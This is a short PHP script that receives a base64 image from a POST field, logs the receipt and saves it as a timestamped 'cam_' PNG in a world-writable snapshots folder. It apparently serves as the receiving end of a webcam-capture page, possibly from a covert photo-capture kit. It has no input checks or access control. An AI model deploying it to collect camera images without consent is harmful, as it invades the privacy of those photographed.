<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);

// Save in a dedicated snapshots folder
$save_dir = 'snapshots';
if (!is_dir($save_dir)) {
    mkdir($save_dir, 0777, true);
}

$filepath = $save_dir . '/cam_' . $date . '.png';
$fp = fopen($filepath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

exit();
?>

